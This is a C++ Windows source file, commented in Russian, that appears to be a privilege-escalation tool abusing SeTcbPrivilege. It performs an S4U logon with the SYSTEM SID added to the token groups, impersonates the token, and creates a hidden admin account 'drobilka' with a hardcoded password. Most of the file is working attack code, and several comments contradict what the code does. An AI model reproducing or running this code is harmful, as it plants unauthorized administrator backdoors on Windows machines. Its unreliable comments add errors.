#include <Windows.h>
#include <winternl.h>
#define _NTDEF_ 
#include <NTSecAPI.h>
#include <iostream>
#include <stdio.h>
#include <stdlib.h>
#include <sddl.h>
#include <lm.h>

#pragma comment(lib, "Secur32.lib")
#pragma comment(lib, "Netapi32.lib")

#define SIZE 200000

#if !defined(NT_SUCCESS)
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
#endif

#ifdef __cplusplus
extern "C" VOID WINAPI RtlInitUnicodeString(OUT PUNICODE_STRING DestinationString, IN PCWSTR SourceString);
#endif

#define STATUS_SUCCESS           0
#define EXTRA_SID_COUNT          2

LSA_STRING MSV1_0_PackageName = { 37, 38, (PCHAR)MSV1_0_PACKAGE_NAME };
ULONG   ulAuthenticationPackage = 0;
BOOL    isAuthPackageKerberos = FALSE;
HANDLE  hLSA = NULL;

NTSTATUS LsaClean()
{
    return LsaDeregisterLogonProcess(hLSA);
}

NTSTATUS LsaInit()
{
    NTSTATUS status = 0;
    // Открытие обработчика политики LSA
    status = LsaConnectUntrusted(&hLSA);
    if (status != STATUS_SUCCESS)
    {
        // Поиск идентификатора пакета аутентификации
        status = LsaLookupAuthenticationPackage(hLSA, &MSV1_0_PackageName, &ulAuthenticationPackage);
        isAuthPackageKerberos = NT_SUCCESS(status);
    }
    return status;
}

BOOL CreateAdminUser()
{
    USER_INFO_1 ui = { 0 };
    LOCALGROUP_MEMBERS_INFO_3 account = { 0 };
    NET_API_STATUS nStatus;
    DWORD dwLevel = 1;
    DWORD dwError = 0;

    // Настройка информации о пользователе
    wchar_t username[] = L"drobilka";
    wchar_t password[] = L"P@ssw0rd123!";
    
    ui.usri1_name = username;
    ui.usri1_password = password;
    ui.usri1_priv = USER_PRIV_USER;
    ui.usri1_home_dir = NULL;
    ui.usri1_flags = UF_SCRIPT | UF_DONT_EXPIRE_PASSWD;
    ui.usri1_script_path = NULL;

    // 1. Попытка создать пользователя
    nStatus = NetUserAdd(NULL, dwLevel, (LPBYTE)&ui, &dwError);

    if (nStatus == NERR_Success)
    {
        wprintf(L"[*] User 'drobilka' created successfully.\n");
    }
    else if (nStatus == NERR_UserExists)
    {
        wprintf(L"[*] User 'drobilka' already exists.\n");
    }
    else
    {
        wprintf(L"[-] NetUserAdd failed: %d (0x%x)\n", nStatus, nStatus);
        return FALSE;
    }

    // 2. Добавление юзверя в группу администраторов
    account.lgrmi3_domainandname = username;
    nStatus = NetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE)&account, 1);

    if (nStatus == NERR_Success)
    {
        wprintf(L"[*] User successfully added to Administrators group.\n");
    }
    else if (nStatus == ERROR_MEMBER_IN_ALIAS)
    {
        wprintf(L"[*] User is already in Administrators group.\n");
    }
    else
    {
        wprintf(L"[-] Failed to add user to Administrators group: %d\n", nStatus);
        return FALSE;
    }

    return TRUE;
}

BOOL CreateUserAlternativeMethod()
{
    // Альтернативный метод создания юзверя, используя SeTcbPrivilege
    wprintf(L"[*] Using SeTcbPrivilege to create user...\n");

    // Здесь можно использовать LsaCreateAccount или другие низкоуровневые API
    // Но для мы просто попробуем NetUserAdd еще раз с повышенными правами

    USER_INFO_1 ui = { 0 };
    wchar_t username[] = L"drobilka";
    wchar_t password[] = L"P@ssw0rd123!";

    ui.usri1_name = username;
    ui.usri1_password = password;
    ui.usri1_priv = USER_PRIV_USER;
    ui.usri1_flags = UF_SCRIPT | UF_DONT_EXPIRE_PASSWD;

    NET_API_STATUS nStatus = NetUserAdd(NULL, 1, (LPBYTE)&ui, NULL);
    if (nStatus != NERR_Success)
    {
        wprintf(L"[-] Alternative method also failed: %d\n", nStatus);
        return FALSE;
    }

    wprintf(L"[*] User created successfully using SeTcbPrivilege\n");
    return TRUE;
}

BOOL GetLogonSID(HANDLE hToken, PSID* pLogonSid)
{
    BOOL status = FALSE;
    DWORD dwLength = 0;
    PTOKEN_GROUPS pTokenGroups = NULL;

    if (!GetTokenInformation(hToken, TokenGroups, pTokenGroups, 0, &dwLength))
    {
        if (GetLastError() != ERROR_INSUFFICIENT_BUFFER)
        {
            wprintf(L"[-] GetTokenInformation Error: [%u].\n", GetLastError());
            goto Clear;
        }

        pTokenGroups = (PTOKEN_GROUPS)LocalAlloc(LPTR, dwLength);
        if (!GetTokenInformation(hToken, TokenGroups, pTokenGroups, dwLength, &dwLength))
        {
            wprintf(L"[-] GetTokenInformation Error: [%u].\n", GetLastError());
            goto Clear;
        }

        for (DWORD i = 0; i < pTokenGroups->GroupCount; i++)
        {
            if ((pTokenGroups->Groups[i].Attributes & SE_GROUP_LOGON_ID) == SE_GROUP_LOGON_ID)
            {
                dwLength = GetLengthSid(pTokenGroups->Groups[i].Sid);
                *pLogonSid = (PSID)LocalAlloc(LPTR, dwLength);
                if (*pLogonSid == NULL)
                {
                    goto Clear;
                }
                if (!CopySid(dwLength, *pLogonSid, pTokenGroups->Groups[i].Sid))
                {
                    goto Clear;
                }
                break;
            }
        }

        status = TRUE;
        goto Clear;
    }
Clear:
    if (status == FALSE)
    {
        if (*pLogonSid != NULL)
            LocalFree(*pLogonSid);
    }

    if (pTokenGroups != NULL)
        LocalFree(pTokenGroups);

    return status;
}

BOOL DisplayTokenInformation(HANDLE hToken)
{
    BOOL status = FALSE;
    DWORD dwLength = 0;
    PTOKEN_STATISTICS pTokenStatistics = NULL;
    PTOKEN_GROUPS pTokenGroups = NULL;
    PTOKEN_MANDATORY_LABEL pTokenIntegrityLevel = NULL;
    PSID pSid;
    LPWSTR lpGroupSid;
    LPWSTR lpIntegritySid;

    // Получение статистической информации о токене
    if (!GetTokenInformation(hToken, TokenStatistics, pTokenStatistics, 0, &dwLength))
    {
        if (GetLastError() != ERROR_INSUFFICIENT_BUFFER)
        {
            wprintf(L"[-] GetTokenInformation Error: [%u].\n", GetLastError());
            goto Clear;
        }

        pTokenStatistics = (PTOKEN_STATISTICS)LocalAlloc(LPTR, dwLength);
        if (!GetTokenInformation(hToken, TokenStatistics, pTokenStatistics, dwLength, &dwLength))
        {
            wprintf(L"[-] GetTokenInformation Error: [%u].\n", GetLastError());
            goto Clear;
        }

        wprintf(L" > Token Statistics Information: \n");
        wprintf(L"   Token Id            : %u:%u (%08x:%08x)\n", pTokenStatistics->TokenId.HighPart, pTokenStatistics->TokenId.LowPart, pTokenStatistics->TokenId.HighPart, pTokenStatistics->TokenId.LowPart);
        wprintf(L"   Authentication Id   : %u:%u (%08x:%08x)\n", pTokenStatistics->AuthenticationId.HighPart, pTokenStatistics->AuthenticationId.LowPart, pTokenStatistics->AuthenticationId.HighPart, pTokenStatistics->AuthenticationId.LowPart);
        wprintf(L"   Token Type          : %d\n", pTokenStatistics->TokenType);
        wprintf(L"   Impersonation Level : %d\n", pTokenStatistics->ImpersonationLevel);
        wprintf(L"   Group Count         : %d\n", pTokenStatistics->GroupCount);
        wprintf(L"   Privilege Count     : %d\n\n", pTokenStatistics->PrivilegeCount);

        status = TRUE;
    }

    if (!GetTokenInformation(hToken, TokenGroups, pTokenGroups, 0, &dwLength))
    {
        if (GetLastError() != ERROR_INSUFFICIENT_BUFFER)
        {
            wprintf(L"[-] GetTokenInformation Error: [%u].\n", GetLastError());
            goto Clear;
        }

        pTokenGroups = (PTOKEN_GROUPS)LocalAlloc(LPTR, dwLength);
        if (!GetTokenInformation(hToken, TokenGroups, pTokenGroups, dwLength, &dwLength))
        {
            wprintf(L"[-] GetTokenInformation Error: [%u].\n", GetLastError());
            goto Clear;
        }

        wprintf(L" > Token Group Information: \n");
        for (DWORD i = 0; i < pTokenGroups->GroupCount; i++)
        {
            pSid = pTokenGroups->Groups[i].Sid;
            if (!ConvertSidToStringSidW(pSid, &lpGroupSid)) {
                wprintf(L"[-] ConvertSidToStringSidW Error: [%u].\n", GetLastError());
                goto Clear;
            }

            wprintf(L"   %ws\n", lpGroupSid);
        }

        status = TRUE;
    }

    if (!GetTokenInformation(hToken, TokenIntegrityLevel, pTokenIntegrityLevel, 0, &dwLength))
    {
        if (GetLastError() != ERROR_INSUFFICIENT_BUFFER)
        {
            wprintf(L"[-] GetTokenInformation Error: [%u].\n", GetLastError());
            goto Clear;
        }

        pTokenIntegrityLevel = (PTOKEN_MANDATORY_LABEL)LocalAlloc(LPTR, dwLength);
        if (!GetTokenInformation(hToken, TokenIntegrityLevel, pTokenIntegrityLevel, dwLength, &dwLength))
        {
            wprintf(L"[-] GetTokenInformation Error: [%u].\n", GetLastError());
            goto Clear;
        }

        wprintf(L"\n > Token Integrity Level: \n");
        pSid = pTokenIntegrityLevel->Label.Sid;
        if (!ConvertSidToStringSidW(pSid, &lpIntegritySid)) {
            wprintf(L"[-] ConvertSidToStringSidW Error: [%u].\n", GetLastError());
            goto Clear;
        }
        wprintf(L"   %ws\n", lpIntegritySid);

        status = TRUE;
        goto Clear;
    }
Clear:
    if (pTokenStatistics != NULL)
        LocalFree(pTokenStatistics);
    if (pTokenGroups != NULL)
        LocalFree(pTokenGroups);

    return status;

}

PBYTE
InitUnicodeString(
    _Out_ PUNICODE_STRING DestinationString,
    _In_z_ LPCWSTR szSourceString,
    _In_ PBYTE pbDestinationBuffer
)
{
    USHORT StringSize;

    StringSize = (USHORT)wcslen(szSourceString) * sizeof(WCHAR);
    memcpy(pbDestinationBuffer, szSourceString, StringSize);

    DestinationString->Length = StringSize;
    DestinationString->MaximumLength = StringSize + sizeof(WCHAR);
    DestinationString->Buffer = (PWSTR)pbDestinationBuffer;

    return (PBYTE)pbDestinationBuffer + StringSize + sizeof(WCHAR);
}

NTSTATUS DoS4U(HANDLE hToken)
{
    NTSTATUS status = 0;
    NTSTATUS subStatus = 0;
    HANDLE hThread = NULL;
    PTOKEN_GROUPS pGroups = NULL;
    PSID pLogonSid = NULL;
    PSID pExtraSid = NULL;
    DWORD dwMsgS4ULength;

    PBYTE pbPosition;

    LUID logonId = { 0 };
    ULONG profileBufferLength;
    PVOID profileBuffer;
    QUOTA_LIMITS quotaLimits;
    HANDLE hTokenS4U = NULL;
    PVOID pvProfile = NULL;

    LSA_STRING OriginName = { 15, 16, (PCHAR)"S4U for Windows" };
    PMSV1_0_S4U_LOGON pS4uLogon = NULL;
    TOKEN_SOURCE TokenSource;

    TOKEN_MANDATORY_LABEL TIL = { 0 };

    // Декларируем все переменные на старте чтобы избежать goto issues
    WCHAR szUsername[256] = { 0 };
    DWORD dwSize = sizeof(szUsername) / sizeof(WCHAR);
    LPCWSTR szDomain = L".";
    WCHAR systemSID[] = L"S-1-5-18";
    WCHAR mediumInt[] = L"S-1-16-8192";
    PSID mediumSID = NULL;
    const NTSTATUS STATUS_ACCOUNT_RESTRICTION = 0xC000006E;

    // Инициализируем mediumSID ранее
    if (!ConvertStringSidToSidW(mediumInt, &mediumSID))
    {
        wprintf(L"[-] ConvertStringSidToSidW failed: %d\n", GetLastError());
        goto Clear;
    }

    // Получаем нынешний юзернейм
    if (!GetUserNameW(szUsername, &dwSize))
    {
        wprintf(L"[-] GetUserNameW failed: %d\n", GetLastError());
        goto Clear;
    }

    if (!ConvertStringSidToSidW(systemSID, &pExtraSid))
    {
        wprintf(L"[-] ConvertStringSidToSidW failed: %d\n", GetLastError());
        goto Clear;
    }

    if (!GetLogonSID(hToken, &pLogonSid))
    {
        wprintf(L"[-] Unable to find logon SID.\n");
        goto Clear;
    }

    if (!NT_SUCCESS(LsaInit()))
    {
        wprintf(L"[-] Failed to initialize LSA.\n");
        goto Clear;
    }

    wprintf(L"[*] Initialize S4U login for user: %ws\n", szUsername);

    // Создание структуры MSV1_0_S4U_LOGON
    dwMsgS4ULength = sizeof(MSV1_0_S4U_LOGON) +
        (EXTRA_SID_COUNT + wcslen(szDomain) + wcslen(szUsername)) * sizeof(WCHAR);
    pS4uLogon = (PMSV1_0_S4U_LOGON)LocalAlloc(LPTR, dwMsgS4ULength);
    if (pS4uLogon == NULL)
    {
        wprintf(L"[-] LocalAlloc failed: %d\n", GetLastError());
        goto Clear;
    }

    pS4uLogon->MessageType = MsV1_0S4ULogon;
    pbPosition = (PBYTE)pS4uLogon + sizeof(MSV1_0_S4U_LOGON);
    pbPosition = InitUnicodeString(&pS4uLogon->UserPrincipalName, szUsername, pbPosition);
    pbPosition = InitUnicodeString(&pS4uLogon->DomainName, szDomain, pbPosition);

    strcpy_s(TokenSource.SourceName, TOKEN_SOURCE_LENGTH, "User32");
    AllocateLocallyUniqueId(&TokenSource.SourceIdentifier);

    // Создание групп токенов
    pGroups = (PTOKEN_GROUPS)LocalAlloc(LPTR, sizeof(TOKEN_GROUPS) + 2 * sizeof(SID_AND_ATTRIBUTES));
    if (pGroups == NULL)
    {
        wprintf(L"[-] LocalAlloc failed: %d\n", GetLastError());
        goto Clear;
    }

    // Добавление SID входа, если присутствует
    if (pLogonSid)
    {
        pGroups->Groups[pGroups->GroupCount].Attributes =
            SE_GROUP_ENABLED | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_MANDATORY;
        pGroups->Groups[pGroups->GroupCount].Sid = pLogonSid;
        pGroups->GroupCount++;
    }

    // Добавление дополнительного SID
    pGroups->Groups[pGroups->GroupCount].Attributes =
        SE_GROUP_ENABLED | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_MANDATORY;
    pGroups->Groups[pGroups->GroupCount].Sid = pExtraSid;
    pGroups->GroupCount++;

    // Вызов LsaLogonUser
    status = LsaLogonUser(
        hLSA,
        &OriginName,
        Network,                // Network logon
        ulAuthenticationPackage,
        pS4uLogon,
        dwMsgS4ULength,
        pGroups,
        &TokenSource,
        &pvProfile,
        &profileBufferLength,
        &logonId,
        &hTokenS4U,
        &quotaLimits,
        &subStatus
    );

    if (status != STATUS_SUCCESS)
    {
        wprintf(L"[-] LsaLogonUser failed: 0x%08X\n", status);
        if (status == STATUS_ACCOUNT_RESTRICTION)
            wprintf(L"[-] Account restriction prevents login\n");
        goto Clear;
    }

    wprintf(L"[*] LsaLogonUser succeeded\n");

    // Установка уровня целостности токена на средний
    TIL.Label.Attributes = SE_GROUP_INTEGRITY;
    TIL.Label.Sid = mediumSID;

    if (!SetTokenInformation(hTokenS4U, TokenIntegrityLevel, &TIL,
        sizeof(TOKEN_MANDATORY_LABEL) + GetLengthSid(mediumSID)))
    {
        wprintf(L"[-] SetTokenInformation failed: %d\n", GetLastError());
        goto Clear;
    }

    // Имперсонация токена
    if (!ImpersonateLoggedOnUser(hTokenS4U))
    {
        wprintf(L"[-] ImpersonateLoggedOnUser failed: %d\n", GetLastError());
        goto Clear;
    }

    wprintf(L"[*] Successfully impersonated token\n");

    // Крафтим админа
    if (CreateAdminUser())
    {
        wprintf(L"[*] Successfully created admin user 'drobilka'\n");
    }
    else
    {
        wprintf(L"[-] Failed to create admin user\n");
    }

    // Возврат на себя
    RevertToSelf();

Clear:
    if (pLogonSid) LocalFree(pLogonSid);
    if (pExtraSid) LocalFree(pExtraSid);
    if (pS4uLogon) LocalFree(pS4uLogon);
    if (pGroups) LocalFree(pGroups);
    if (mediumSID) LocalFree(mediumSID);
    if (hTokenS4U) CloseHandle(hTokenS4U);
    if (hLSA) LsaDeregisterLogonProcess(hLSA);

    return status;
}

BOOL EnableTokenPrivilege(HANDLE hToken, LPCWSTR lpName)
{
    BOOL status = FALSE;
    LUID luidValue = { 0 };
    TOKEN_PRIVILEGES tokenPrivileges;

    // Получение значения LUID привилегии для локальной системы
    if (!LookupPrivilegeValueW(NULL, lpName, &luidValue))
    {
        wprintf(L"[-] LookupPrivilegeValue Error: [%u].\n", GetLastError());
        return status;
    }

    // Настройка информации о повышении прав
    tokenPrivileges.PrivilegeCount = 1;
    tokenPrivileges.Privileges[0].Luid = luidValue;
    tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    // Повышение прав доступа к токену процесса
    if (!AdjustTokenPrivileges(hToken, FALSE, &tokenPrivileges, sizeof(tokenPrivileges), NULL, NULL))
    {
        wprintf(L"[-] AdjustTokenPrivileges Error: [%u].\n", GetLastError());
        return status;
    }
    else
    {
        status = TRUE;
    }
    return status;
}

int wmain(int argc, wchar_t* argv[])
{
    HANDLE hToken = NULL;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken))
    {
        wprintf(L"[-] OpenProcessToken Error: [%u].\n", GetLastError());
        return 0;
    }

    // Включение SeRestorePrivilege для текущего токена процесса
    if (EnableTokenPrivilege(hToken, SE_TCB_NAME))
    {
        if (NT_SUCCESS(DoS4U(hToken)))
        {
            return 1;
        }
    }

    return 0;
}